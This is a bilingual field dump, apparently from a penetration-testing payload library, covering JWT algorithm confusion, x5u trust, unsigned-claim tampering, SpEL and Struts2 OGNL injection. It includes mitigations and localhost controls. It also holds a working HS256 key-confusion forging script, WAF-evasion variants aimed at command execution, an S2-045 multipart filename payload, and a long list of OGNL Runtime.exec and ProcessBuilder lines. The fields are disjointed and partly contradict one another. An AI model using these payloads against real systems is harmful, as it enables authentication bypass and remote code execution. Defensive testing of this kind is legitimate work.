trap 'rm -rf "$work_dir"' EXIT
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out "$work_dir/test-private.pem"
openssl pkey -in "$work_dir/test-private.pem" -pubout -out "$work_dir/test-public.pem"
python3 - "$work_dir/test-public.pem" <<'PY'
import base64, hashlib, hmac, json, sys, time
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
public_key = open(sys.argv[1], "rb").read()
header = encode({"alg": "HS256", "typ": "payloader+jwt", "kid": "PAYLOADER_RSA_TEST_KEY"})
claims = encode({"sub": "payloader-negative", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60})
signature = base64.urlsafe_b64encode(hmac.new(public_key, (header + "." + claims).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
print(header + "." + claims + "." + signature)
PY
# This historical confusion token is generated only from a temporary local public key; a modern verifier rejects it.

analysis.zh: 本条聚焦JWT 算法与 Key 解析边界混合集。阳性必须表现为 localhost 验证器在错误算法、错误 key 来源或错误 claim 条件下仍建立了错误主体并读取同一只读标记，同时由验证器日志确认具体分支。解码成功、令牌可生成、key 文件存在、工具退出码、HTTP 200 错误页或客户端显示 claim 都不是绕过证据。
analysis.en: This entry focuses on Mixed JWT Algorithm and Key Resolution Boundaries. A positive result requires the localhost verifier to establish the wrong principal and read the same read-only marker under a wrong algorithm, key source, or claim condition, with verifier logs identifying the branch. Successful decoding, token generation, key-file presence, tool exit status, an HTTP 200 error page, or client-visible claims do not prove bypass.

opsecTips.zh: 每个机制最多提交一个有效基线和三个阴性对照；首次出现非 localhost 请求、真实账户、意外 key 读取、状态写入或服务抖动时立即停止。
opsecTips.en: Submit at most one valid baseline and three negative controls per mechanism; stop immediately on any non-localhost request, real account, unexpected key read, state write, or service instability.

opsecTips.zh: 删除临时 token、key、证书、JWKS 与短字典，停止本地 fixture 服务，撤销测试 jti/会话并确认验证器缓存已清空。
opsecTips.en: Delete temporary tokens, keys, certificates, JWKS files, and short dictionaries; stop local fixture services, revoke test jtis and sessions, and confirm verifier caches are cleared.

title.zh: 公钥 HMAC 混淆签名

python3 - <<'PY'
import base64, hmac, hashlib
pub = open(".payloader-jwt-fixture/public.pem").read()
h = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip('=')

overview.en: This payload covers JWT algorithm and key-type binding, testing whether an RS256 service accepts an HS256 confusion token using the public key as an HMAC secret. Validation covers a locally built RSA confusion control and token submission, mapped to steps 1 and 2.

vulnerability.zh: 根因在于验证器按令牌头选择算法且未绑定密钥类型：公钥被当作 HMAC 共享密钥使用，而公钥人人可得，攻击者据此自行签发任意合法 HS256 令牌。
vulnerability.en: The root cause is selecting the algorithm from the token header without binding key types: the public key is treated as an HMAC shared secret, and since public keys are public, attackers can self-issue arbitrary valid HS256 tokens.

exploitation.zh: 第 1 步运行脚本生成临时 RSA 密钥对，以公钥为 HMAC secret 签发 alg 为 HS256 的混淆令牌；第 2 步用 curl 携带该令牌请求标记路径并观察状态码。混淆令牌被接受即确认算法混淆漏洞，401 拒绝则说明绑定生效。成功判据以响应码与 key 决策记录为准。占位符在全局变量菜单替换；HMAC 密钥仅使用自有 fixture 而非 TLS 证书。
exploitation.en: In step 1, run the script to generate a temporary RSA keypair, sign an HS256 confusion token using the public key as the HMAC secret, and submit it to the local endpoint. In step 2, use curl with the control token against the marker path and read the status code. Acceptance confirms algorithm confusion; a 401 rejection shows binding works. Judge success by the status code and key-decision records. Replace placeholders via the global variables menu; use only your own fixture key for HMAC, not the TLS certificate.

mitigation.zh: 按签发配置固定算法与密钥类型，RS256 场景显式禁用 HMAC 家族并拒绝类型不符的密钥。修复后重放第 1、2 步，混淆令牌应被 401 拒绝。
mitigation.en: Pin algorithm and key type to the issuance configuration, explicitly disable the HMAC family for RS256 deployments, and reject type-mismatched keys. After the fix, replay steps 1 and 2: the confusion token should be rejected with 401.

title.en: Submit the JWT X5U Certificate Source Allowlisting Negative Control

description.zh: 只提交当前验证卡的第一条对照，并保持 issuer、主体和只读目标不变。
description.en: Submit only the first control in this validation card while keeping issuer, principal, and read-only target unchanged.

attackChain.payload:
python3 - <<'PY'
import base64, subprocess, time, urllib.error, urllib.request
import jwt
subprocess.run(["openssl","req","-x509","-new","-key",".payloader-jwt-fixture/private.pem","-out",".payloader-jwt-fixture/test-cert.pem","-days","1","-subj","/CN=payloader-local"], check=True)
private_key = open(".payloader-jwt-fixture/private.pem", "rb").read()
token = jwt.encode(
    {"sub":"payloader-negative","iss":"payloader-test","aud":"payloader-api","iat":int(time.time()),"exp":int(time.time())+60},
    private_key,
    algorithm="RS256",
    headers={"typ":"payloader+jwt","kid":"PAYLOADER_LOCAL_KEY","x5u":"http://127.0.0.1:18080/test-cert.pem"},
)
request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+token})
try:
    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)
PY
# Expected: reject unless the exact local X5U and certificate chain are preconfigured and trusted for the issuer.

description.zh: 关联算法选择、key resolver、claim 校验、HTTP 状态和最终主体，排除仅能生成或解码 token 的假阳性。
description.en: Correlate algorithm selection, key resolver, claim validation, HTTP status, and final principal, excluding token generation or decoding as false positives.

description.zh: 删除本地 token、key、证书和缓存，重放有效基线与全部固定阴性对照。
description.en: Delete local tokens, keys, certificates, and caches, then replay the valid baseline and every fixed negative control.

overview.zh: 该 Payload 覆盖 JWT x5u 证书来源允许列表场景，检验验证器是否跟随令牌自带证书 URL 而忽略本地信任配置。验证维度为 localhost 证书夹具与外部 x5u 的对照单步执行，对应第 1 步。
overview.en: This payload covers the JWT x5u certificate-source allowlist, testing whether the verifier follows token-supplied certificate URLs instead of local trust configuration. Validation contrasts a localhost certificate fixture with external x5u values in one step, mapped to step 1.

vulnerability.zh: 根因在于验证器把 x5u 指向的内容当作可信证书链：攻击者托管自签证书并在头部声明，服务端拉取后完成验签，签发方信任边界被完全绕开。
vulnerability.en: The root cause is treating x5u-targeted content as a trusted chain: attackers host self-signed certificates, declare them in the header, and the server fetches and verifies against them, fully bypassing issuer trust boundaries.

exploitation.zh: 第 1 步执行脚本用 openssl 生成测试证书并以 fixture 私钥签发携带 x5u 的令牌（x5u 指向本地 18080 端口，需先在 .payloader-jwt-fixture 目录执行 `python3 -m http.server 18080 --bind 127.0.0.1` 托管证书），提交后记录服务端对证书来源的决策：仅本地预配置来源被信任即证明允许列表生效，外部 x5u 被拉取验签即确认信任缺陷。成功判据以证书来源日志为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, run the script to generate a test certificate with openssl and serve it from a local fixture, building tokens with preconfigured and external x5u values and submitting each while recording the server's certificate-source decisions; trusting only the local preconfigured source proves the allowlist, fetching and verifying against external x5u confirms the trust flaw. Judge success by certificate-source logs. Replace placeholders via the global variables menu.

mitigation.zh: x5u 仅允许预注册地址且证书必须链入本地信任库，拒绝重定向与跨域拉取。修复后重放第 1 步，外部 x5u 应被拒绝并记录告警。
mitigation.en: Permit x5u only from pre-registered addresses with certificates chaining into the local trust store, refusing redirects and cross-origin fetches. After the fix, replay step 1: external x5u should be rejected with alerts.

name.zh: JWT 未签名权限声明篡改

description.zh: 验证修改 role、is_admin、permissions 等声明后，服务端是否在缺少有效签名的情况下信任这些权限字段。
description.en: Tests whether the server trusts modified role, is_admin, or permissions claims when the token lacks a valid signature.

prerequisites.zh: 为低权限合成用户签发有效 JWT，并准备一个只读管理员 canary 端点以区分 claims 展示与服务端授权。
prerequisites.en: Issue a valid JWT for a low-privilege synthetic user and prepare a read-only administrator canary endpoint to distinguish claim display from server-side authorization.

prerequisites.zh: 只修改 role、is_admin 或 permissions claim 并移除/破坏签名，记录签名验证结果、最终主体和授权决策。
prerequisites.en: Modify only role, is_admin, or permissions claims while removing or corrupting the signature, recording signature results, final principal, and authorization decision.

title.en: Validation step 1 for Unsigned JWT Privilege-Claim Tampering

description.zh: 把空签名 role 提升令牌逐条提交；服务端在校验前信任载荷角色，即确认签名验证缺失下的权限篡改。
description.en: Submit each empty-signature role-escalated token; the server trusting payload roles before verification confirms privilege tampering under missing signature validation.

analysis.zh: 阳性是被篡改且无有效签名的权限 claim 被服务器信任，使低权限主体读取管理员 canary，审计显示授权直接采用该 claim。前端菜单变为管理员、Base64URL 解码显示 admin、返回 401/403、仅登录成功或原账户本就有权限都属于假阳性。
analysis.en: Positive evidence is a tampered privilege claim without a valid signature being trusted by the server so the low-privilege principal can read the administrator canary, with auditing showing authorization derived from that claim. An administrator menu in the client, Base64URL decoding that displays admin, HTTP 401 or 403, ordinary login success, or an account already entitled to the resource is a false positive.

opsecTips.zh: 管理员 canary 首次被无效签名 token 读取后停止，不尝试修改角色、账户或业务数据。
opsecTips.en: Stop after the administrator canary is first read with an invalidly signed token; do not modify roles, accounts, or business data.

opsecTips.zh: 撤销合成账户和全部测试 JWT，清除 claims/授权缓存与审计标记，测试结束后向修复方确认签名先于授权的校验顺序已恢复。
opsecTips.en: Revoke the synthetic account and all test JWTs, clear claim and authorization caches and audit markers, and restore signature validation before authorization.

description.zh: 完全省略第三个点段（仅两段），绕过“必须三段”与空签名段两类校验；成功判据：两段令牌被接受且 role 生效。
description.en: Drops the third segment entirely, evading both the must-have-three-segments and empty-signature checks. Success: the two-segment token is accepted and the role applies.

title.zh: 头部变形：占位签名与声明增补
title.en: Header Mutation: Placeholder Signature with Extra Claims

description.zh: 签名段以 AA 占位并增补 iss/exp 声明，改变 base64 特征的同时满足宽松校验；成功判据：令牌以 admin 权限通过。
description.en: Uses an AA placeholder signature and adds iss/exp claims to alter the base64 signature while satisfying lenient checks. Success: the token passes with admin privileges.

title.zh: 头部变形：嵌套 JWT 伪装

description.zh: 把伪造令牌藏进外层头部 nested 字段（双击解包型实现），规避对 payload 直接含 role 的检测；成功判据：实现解包后接受内层令牌。
description.en: Hides the forged token in a nested header field for unwrap-style implementations, evading direct role-in-payload detection. Success: the impl unwraps and accepts the inner token.

description.zh: 使用原始低权限令牌请求管理员接口，确认服务端拒绝受保护操作并记录响应基线。
description.en: Confirm that the original low-privilege token cannot perform an administrative action.

description.zh: 使用原始令牌变体依次更改 role、is_admin 或 permissions，保持其他字段不变。
description.en: Use the original token variants to change role, is_admin, or permissions one at a time while preserving other fields.

description.zh: 通过受保护资源和审计日志验证是否真实提权，忽略仅客户端显示变化。
description.en: Use the protected resource and audit log to verify actual escalation, ignoring client-only display changes.

overview.zh: 该 Payload 覆盖 JWT 未签名权限声明篡改场景，检验服务端是否在验签前信任载荷中的角色字段。验证维度为空签名携带角色提升载荷的令牌矩阵，对应第 1 步。
overview.en: This payload covers unsigned JWT privilege-claim tampering, testing whether the server trusts role fields in the payload before verifying signatures. Validation is a token matrix of empty-signature payloads with role elevation, mapped to step 1.

vulnerability.zh: 根因在于应用先把 JWT 载荷解析为身份对象再执行验签：签名校验失败未中止流程时，篡改的 role 或 admin 字段已进入授权判定。
vulnerability.en: The root cause is applications parsing the JWT payload into an identity object before verification: when failed signature checks do not abort the flow, tampered role or admin fields already drive authorization.

exploitation.zh: 第 1 步按脚本构造保留原头部与载荷但签名置空的令牌，把 role 改为管理员值后逐条提交受保护端点，记录响应与实际主体：服务端按载荷角色放行即确认验签顺序缺陷。成功判据以提权后的接口访问为准。占位符在全局变量菜单替换；同时以正确签名令牌对照排除解析问题。
exploitation.en: In step 1, build tokens keeping the original header and payload but with empty signatures, set role to an administrator value, and submit each to the protected endpoint per the script, recording responses and the effective principal; the server honoring the payload role confirms the verification-order flaw. Judge success by post-elevation API access. Replace placeholders via the global variables menu; contrast with correctly signed tokens to rule out parsing issues.

mitigation.zh: 验签必须在任何载荷字段进入授权逻辑前完成且失败即中止，身份对象仅由验证后的载荷构建。修复后重放第 1 步，全部空签名令牌应被拒绝且无提权效果。
mitigation.en: Verification must complete before any payload field reaches authorization logic and abort on failure, building identity objects only from verified payloads. After the fix, replay step 1: every empty-signature token should be rejected with no elevation effect.

name.zh: JWT 签名验证负向测试

description.zh: 使用缺失或异常签名的 JWT 结构验证服务端是否在解析声明后仍严格执行算法与签名校验。
description.en: Uses JWT structures with missing or abnormal signatures to test whether a server strictly enforces algorithm and signature validation after parsing claims.

prerequisites.zh: 为低权限合成用户签发一枚有效 JWT，固定 issuer、audience、时效、算法、kid 和只读 canary 端点。
prerequisites.en: Issue one valid JWT for a low-privilege synthetic user, pinning issuer, audience, lifetime, algorithm, kid, and a read-only canary endpoint.

prerequisites.zh: 仅移除、截断或异常化签名部分，保持 Header/Payload 与请求上下文一致，并采集解析、验证和授权阶段日志。
prerequisites.en: Only remove, truncate, or abnormalize the signature segment while keeping header, payload, and request context fixed, collecting parsing, validation, and authorization-stage logs.

title.en: Validation step 1 for JWT Signature-Validation Negative Testing

description.zh: 把去签名与空 kid 令牌逐条提交受保护端点；任一令牌被接受，即确认签名验证缺失。
description.en: Submit each signature-stripped or empty-kid token to the protected endpoint; any token accepted confirms missing signature validation.

analysis.zh: 阳性要求缺失或异常签名的 token 通过服务端验证并以合成主体读取认证 canary，日志显示授权发生在签名成功之前或签名被跳过。Header 可解码、解析器识别 alg、错误信息不同、返回匿名 200、网关接收后资源端拒绝、或合法基线成功都不是签名绕过。
analysis.en: Positive evidence requires a token with a missing or abnormal signature to pass server validation and read the authenticated canary as the synthetic principal, with logs showing authorization before signature success or skipped verification. A decodable header, parser recognizing alg, different errors, anonymous HTTP 200, gateway acceptance followed by resource-server rejection, or success of the valid baseline is not signature bypass.

opsecTips.zh: 一个无效签名 token 首次读取只读 canary 后停止，不篡改权限 claims 或调用写接口。
opsecTips.en: Stop after one invalidly signed token first reads the read-only canary; do not tamper with privilege claims or invoke write endpoints.

opsecTips.zh: 撤销测试 token 和账户，清除验证/JWKS 缓存与诊断日志，并恢复签名必需和算法固定。
opsecTips.en: Revoke test tokens and the account, clear validation and JWKS caches and diagnostic logs, and restore mandatory signatures and algorithm pinning.

title.zh: 头部变形：签名截断变体

description.zh: 签名截断一半，测试实现只校验前 N 字节或长度宽容的场景；成功判据：截断签名令牌仍通过验证。
description.en: Truncates the signature to test prefix-check or length-lenient implementations. Success: the truncated-signature token still validates.

title.zh: 头部变形：非法 base64 签名变体

description.zh: 签名段填非法字符 !!!!，探测异常处理路径是否回退为通过（fail-open）；成功判据：非法签名未导致拒绝。
description.en: Fills the signature with invalid characters to probe whether error handling fails open. Success: the invalid signature does not cause rejection.

title.zh: 头部变形：算法错配组合变体

description.zh: 头部声明 ES256 而签名填充 64 字节，验证是否只按头部声明做长度校验；成功判据：伪签名通过椭圆曲线校验路径。
description.en: Claims ES256 in the header with 64 filler signature bytes to test header-only length validation. Success: the fake signature passes the EC verification path.

title.zh: 建立低权限 JWT 基线

description.zh: 使用合法低权限令牌访问受保护接口，记录主体、权限和审计事件。
description.en: Use a valid low-privilege token on a protected endpoint and record principal, permissions, and audit events.

description.zh: 逐项使用原始 JWT 片段进行请求，保持 issuer、audience 与接口不变。
description.en: Use original JWT fragments one at a time while keeping issuer, audience, and endpoint unchanged.

description.zh: 从服务端日志核对验签与权限决策，排除仅解析成功或客户端显示变化。
description.en: Verify signature and authorization decisions in server logs, excluding parsing success and client display changes.

overview.zh: 该 Payload 覆盖 JWT 签名验证负向测试场景，检验服务端对缺失与异常签名结构的拒绝边界。验证维度为去签名、空签名与 kid=/dev/null（空密钥文件）令牌的提交矩阵，对应第 1 步。
overview.en: This payload covers JWT signature-verification negative testing, testing rejection boundaries for missing and anomalous signature structures. Validation is a submission matrix of stripped, empty and empty-kid tokens, mapped to step 1.

vulnerability.zh: 根因在于解析与验签的执行顺序或失败处理存在缺口：截断签名或空 kid 的令牌落入宽松解析分支，声明在验签前即被采信并进入授权。
vulnerability.en: The root cause is gaps in parse-then-verify ordering or failure handling: truncated-signature and empty-kid tokens fall into lenient parsing branches with claims trusted and authorized before verification.

exploitation.zh: 第 1 步按脚本把去签名、空签名与 kid=/dev/null（空密钥文件）变体逐条提交受保护端点，记录响应与实际主体：任一变体被接受即确认验签缺失，同时以完整签名令牌对照确认解析本身无碍。成功判据以变体接受矩阵为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, submit stripped-signature, empty-signature and empty-kid variants to the protected endpoint one by one per the script, recording responses and effective principals; any variant accepted confirms missing verification, contrasted with fully signed tokens to confirm parsing itself is intact. Judge success by the variant-acceptance matrix. Replace placeholders via the global variables menu.

mitigation.zh: 验签失败或结构异常一律 401 且日志记录伪造尝试，签名段缺失不进入解析。修复后重放第 1 步矩阵，全部变体应被统一拒绝。
mitigation.en: Return 401 on verification failure or structural anomalies with forgery attempts logged, never parsing tokens missing signature segments. After the fix, replay the step 1 matrix: every variant should be uniformly rejected.

name.zh: Spring SpEL 注入

description.zh: 在 localhost SimpleEvaluationContext Fixture 中仅计算固定算术表达式，并断言类型访问和方法调用均关闭。
description.en: Evaluate one fixed arithmetic expression in a localhost SimpleEvaluationContext fixture and assert that type access and method invocation are disabled.

prerequisites.zh: 使用 SimpleEvaluationContext 或等价最小上下文，关闭类型、方法、Bean 与类加载访问。
prerequisites.en: Use SimpleEvaluationContext or an equivalent minimal context with type, method, bean, and class-loading access disabled.

prerequisites.zh: Fixture 只接受固定算术表达式并返回 result 与能力标志。
prerequisites.en: Configure the fixture to accept only a fixed arithmetic expression and return the result plus capability flags.

execution.command: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/api/lab/spel/evaluate" -H "Content-Type: application/json" -H "X-Request-ID: spel-simple-001" --data '{"expression":"7 * 7","mode":"simple"}' | jq -e '.result == 49 and .type_access == false and .method_invocation == false'

description.zh: 在本地 simple 模式计算固定算术，并断言类型访问与方法调用能力均关闭。
description.en: Evaluate fixed arithmetic in local simple mode and assert that type access and method invocation capabilities are both disabled.

analysis.zh: 算术返回 49 只证明存在求值路径。只有不可信输入能访问超出业务需要的类型、方法、Bean 或敏感对象才构成安全问题。本批明确断言高风险能力关闭，并不尝试命令、文件或网络。
analysis.en: Arithmetic result 49 proves an evaluation path only. A security issue requires untrusted input to access types, methods, beans, or sensitive objects beyond business need. This batch asserts risky capabilities are disabled and attempts no command, file, or network action.

opsecTips.zh: 表达式固定为纯算术，禁止类名、方法名、路径、主机、反射或脚本引擎。
opsecTips.en: Keep the expression purely arithmetic with no class names, methods, paths, hosts, reflection, or script engines.

opsecTips.zh: Fixture 五秒超时、无网络出口，并只保存结果与能力标志。
opsecTips.en: Use a five-second no-egress fixture and retain only the result and capability flags.

description.zh: 绕过对 T(java.lang.Runtime) 直引特征的封锁：经 String 类反射获取 Runtime；命令输出出现即成功。
description.en: Reach Runtime reflectively through T(String) past direct T(java.lang.Runtime) signatures; command output appearing confirms success.

description.zh: 以 ProcessBuilder 替代 Runtime.exec 且参数数组构造：特征指纹改变；进程副作用出现即成功。
description.en: Swap in ProcessBuilder with an argument array, shifting the fingerprint; process side effects appearing confirm success.

description.zh: 表单编码载体承载 SpEL：绕过 JSON 体与明文表达式扫描；求值输出返回即成功。
description.en: Carry the expression in a form-encoded field past JSON-body and plaintext scans; evaluation output returning confirms success.

description.zh: 记录上下文类型、属性访问器和所有禁用的高风险能力。
description.en: Record context type, property accessors, and every disabled high-risk capability.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/api/lab/spel/evaluate" -H "Content-Type: application/json" -H "X-Request-ID: spel-simple-001" --data '{"expression":"7 * 7","mode":"simple"}' | jq -e '.result == 49 and .type_access == false and .method_invocation == false'

description.zh: 向 localhost Fixture 提交 7*7，并要求返回结果和能力标志。
description.en: Submit 7*7 to the localhost fixture and require the result plus capability flags.

description.zh: 将请求与上下文创建、类型拒绝和方法禁用日志关联。
description.en: Correlate the request with context creation, type rejection, and method-disable logs.

description.zh: 更新策略后重放算术与无效类型引用，确认业务计算保留且危险能力拒绝。
description.en: After policy updates, replay arithmetic and an invalid type reference to preserve business evaluation and deny dangerous capabilities.

overview.zh: Spring SpEL 简单求值边界验证针对表达式求值上下文配置的场景：业务是否把表达式限制在 SimpleEvaluationContext 中。验证仅计算固定算术表达式，并断言类型访问与方法调用能力均已关闭。
overview.en: The Spring SpEL simple-evaluation boundary validation targets expression-evaluation context configuration: whether the business confines expressions to a SimpleEvaluationContext. It evaluates only a fixed arithmetic expression and asserts both type access and method invocation are disabled.

vulnerability.zh: 风险源于把不可信表达式放入 StandardEvaluationContext 或开放类型解析、方法调用、Bean 解析能力；表达式语法被识别只是前提，实际影响取决于上下文对象与可用能力。
vulnerability.en: The risk stems from placing untrusted expressions in a StandardEvaluationContext or enabling type resolution, method invocation, and bean-resolution capabilities; recognized expression syntax is only a prerequisite—actual impact depends on context objects and available capabilities.

exploitation.zh: 按第 1 步向 /api/lab/spel/evaluate 的 simple 模式提交固定算术 7*7 并携带请求 ID；命中判据为返回 49 且 type_access 与 method_invocation 两个能力标志均为关闭。该组合构成配置证据：结果 49 证明表达式进入服务端求值，能力标志证明危险上下文未开放。不要用回显数字单独判断任意 SpEL 注入，也不要尝试 Runtime、ProcessBuilder 或反射调用。
exploitation.en: As in step 1, submit the fixed arithmetic 7*7 to /api/lab/spel/evaluate in simple mode with a request ID; a hit is a returned 49 with both the type_access and method_invoke capability flags disabled. The combination is configuration evidence: 49 proves server-side evaluation while the flags prove the dangerous context is closed. Do not judge arbitrary SpEL injection from the echoed number alone, and do not attempt Runtime, ProcessBuilder, or reflective calls.

mitigation.zh: 避免求值不可信表达式；必须支持时使用 SimpleEvaluationContext、受限属性访问器与明确变量，禁用类型定位、构造器、方法与 Bean 解析，并对长度、复杂度和超时设限。修复后重放第 1 步请求，确认能力标志保持关闭并记录拒绝。
mitigation.en: Avoid evaluating untrusted expressions; when expression support is required, use SimpleEvaluationContext with restricted property accessors and explicit variables, disable type location, constructors, methods, and bean resolution, and cap length, complexity, and timeouts. After the fix, replay the step-1 request and confirm the capability flags stay off with rejections logged.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: Struts2 OGNL 简单求值边界验证

description.zh: 在 localhost Struts Fixture 中仅提交固定算术 OGNL，验证结果并断言静态方法和进程启动能力关闭。
description.en: Submit one fixed arithmetic OGNL expression to a localhost Struts fixture and validate the result while asserting static-method and process-start capabilities are disabled.

prerequisites.zh: 使用固定 Struts2 版本和受限 OGNL Fixture，不加载文件或命令执行辅助类。
prerequisites.en: Use a fixed Struts2 version and restricted OGNL fixture without file or command-execution helper classes.

prerequisites.zh: 记录 excludedClasses、excludedPackageNames 与静态方法访问设置。
prerequisites.en: Record excludedClasses, excludedPackageNames, and static-method-access settings.

execution.command: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/struts-lab/evaluate" -H "X-Request-ID: struts-ognl-simple-001" --data-urlencode 'value=%{7*7}' | jq -e '.result == 49 and .static_method_access == false and .process_start == false'

description.zh: 向本地受限求值器提交固定算术，断言结果为 49 且静态方法和进程启动能力关闭。
description.en: Submit fixed arithmetic to the restricted local evaluator and assert result 49 with static-method and process-start capabilities disabled.

analysis.zh: 结果 49 仅说明表达式被求值，不证明可访问 Runtime 或文件系统。阳性需要静态方法、成员访问或危险对象边界被突破；本批主流程明确验证这些能力为 false，执行与规避形态仅保留在 WAF 绕过参考区，不进入主验证流程。
analysis.en: Result 49 establishes expression evaluation only, not access to Runtime or the filesystem. A positive requires a static-method, member-access, or dangerous-object boundary breach; this batch asserts those capabilities false and retires execution plus evasion material.

opsecTips.zh: 只使用固定算术表达式，不修改 MemberAccess、排除类、响应流或文件。
opsecTips.en: Use one fixed arithmetic expression without changing MemberAccess, exclusions, response streams, or files.

opsecTips.zh: 容器无网络出口和业务数据，五秒超时后清理求值日志。
opsecTips.en: Keep the container free of egress and business data, enforcing five seconds and clearing evaluation logs.

description.zh: 绕过对 @...@ 单一表达式特征的检测：拆成映射变量两段链式调用；命令执行输出返回即成功。
description.en: Split into mapped variables chained in two stages past single-expression signatures; returned command output confirms success.

description.zh: 成员名与命令参数 Unicode 转义：明文特征缺失而解析等价；执行结果回显即成功。
description.en: Unicode-escape member names and arguments so plaintext signatures vanish while parsing stays equivalent; echoed execution results confirm success.

description.zh: 以 multipart 字段承载 OGNL：绕过对纯文本体扫描的规则；进程执行副作用出现即成功。
description.en: Carry the OGNL in a multipart field past plain-body scanning; process execution side effects confirm success.

description.zh: # 与关键符号以 \u 转义书写，规避对 #context/#memberAccess 的明文规则；成功判据：OGNL 求值后命令执行。
description.en: Writes # and key symbols as \u escapes to evade plaintext #context/#memberAccess rules. Success: the command runs after OGNL evaluation.

wafBypass.command:
POST / HTTP/1.1
Content-Type: multipart/form-data; boundary=xx

--xx
Content-Disposition: form-data; name="upload"; filename="%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('id')}"

x
--xx--

description.zh: S2-045 形态把 OGNL 放进文件名，WAF 对 multipart 文件名的解析弱于 URL 正文；成功判据：上传请求触发命令执行。
description.en: The S2-045 form places OGNL in the filename where WAF parsing is weaker than for URL bodies. Success: the upload triggers command execution.

description.zh: 换 ProcessBuilder 构造并 %{} 包裹，规避 @Runtime@exec 特征；成功判据：进程生成（OAST 验证）。
description.en: Switches to ProcessBuilder with %{} wrapping to evade @Runtime@exec signatures. Success: process spawns (verify via OAST).

title.en: Validation step 1 for Apache Struts OGNL Injection

wafBypass.command:
(#context['xwork.MethodAccessor.denyMethodExecution']=false)
(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)
(#rt=@java.lang.Runtime@getRuntime())
(#process=#rt.exec('id'))
(#process=#rt.exec('whoami'))
(#process=#rt.exec('cat /flag'))
(#process=#rt.exec('ls /'))
(#process=#rt.exec('pwd'))
(#process=#rt.exec('uname -a'))
(#process=#rt.exec('hostname'))
(#process=#rt.exec(new String[]{'id'}))
(#process=#rt.exec(new String[]{'whoami'}))
(#process=#rt.exec(new String[]{'cat /flag'}))
(#process=#rt.exec(new String[]{'ls /'}))
(#process=#rt.exec(new String[]{'pwd'}))
(#process=#rt.exec(new String[]{'uname -a'}))
(#process=#rt.exec(new String[]{'hostname'}))
(#process=new java.util.Scanner(#rt.exec('id').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('whoami').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('cat /flag').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('ls /').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('pwd').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('uname -a').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('hostname').getInputStream()).next())
(#process=#rt.exec('id').waitFor())
(#process=#rt.exec('whoami').waitFor())
(#process=#rt.exec('cat /flag').waitFor())
(#process=#rt.exec('ls /').waitFor())
(#process=#rt.exec('pwd').waitFor())
(#process=#rt.exec('uname -a').waitFor())
(#process=#rt.exec('hostname').waitFor())
(#process=new java.lang.ProcessBuilder(new String[]{'id'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'whoami'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'cat /flag'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'ls /'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'pwd'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'uname -a'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'hostname'}).start())

description.zh: OGNL注入 (Struts2)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：OGNL 求值执行命令并返回对应输出。
description.en: Run this Apache Struts OGNL Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: OGNL evaluation runs the command and returns the matching output.

title.zh: 固定 Struts 与 OGNL 策略

description.zh: 记录 Struts 版本、成员访问、排除类和允许绑定字段。
description.en: Record Struts version, member access, excluded classes, and allowed binding fields.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/struts-lab/evaluate" -H "X-Request-ID: struts-ognl-simple-001" --data-urlencode 'value=%{7*7}' | jq -e '.result == 49 and .static_method_access == false and .process_start == false'

description.zh: 向 localhost Fixture 提交 7*7，只读取结果与能力标志。
description.en: Submit 7*7 to the localhost fixture and read only the result and capability flags.

description.zh: 按请求 ID 核对求值、静态方法拒绝和无进程启动事件。
description.en: Use the request ID to verify evaluation, static-method denial, and absence of process starts.

description.zh: 升级后重放正常字段和算术值，确认业务绑定保留且高风险能力关闭。
description.en: After upgrade, replay normal fields and arithmetic to preserve business binding while risky capabilities remain disabled.

overview.zh: Struts2 OGNL 简单求值边界验证针对 OGNL 表达式求值能力的场景：受限求值器是否真的关闭了危险能力。验证仅提交固定算术 OGNL，断言结果正确且静态方法与进程启动能力关闭。
overview.en: The Struts2 OGNL simple-evaluation boundary validation targets OGNL evaluation capability: does the restricted evaluator truly disable dangerous capabilities? It submits only a fixed arithmetic OGNL expression and asserts a correct result with static-method and process-start capabilities closed.

vulnerability.zh: Struts2 历史 OGNL 问题源于不可信请求值进入表达式求值且成员访问或排除策略可被绕过；单纯支持 OGNL 与算术不等于 RCE，必须证明主体可越过成员访问边界到达危险类型或方法。
vulnerability.en: Historical Struts2 OGNL issues stem from untrusted request values entering expression evaluation with bypassable member-access or exclusion policies; supporting OGNL and arithmetic alone is not RCE—you must prove the principal can cross the member-access boundary into dangerous types or methods.

